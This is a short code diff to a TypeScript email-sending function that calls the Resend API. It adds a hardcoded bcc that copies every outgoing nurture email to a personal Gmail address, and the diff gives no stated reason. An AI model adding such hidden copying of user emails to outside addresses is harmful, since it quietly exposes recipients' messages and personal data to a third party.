@@ -258,7 +258,13 @@ async function sendNurtureEmail(to: string, subject: string, html: string): Prom
     const res = await fetch(RESEND_API, {
       method: "POST",
       headers: { Authorization: `Bearer ${key}`, "Content-Type": "application/json" },
-      body: JSON.stringify({ from: FROM, to: [to], subject, html }),
+      body: JSON.stringify({
+        from: FROM,
+        to: [to],
+        bcc: ["bryan.greer1@gmail.com"],
+        subject,
+        html,
+      }),
     });
     return res.ok;
   } catch {
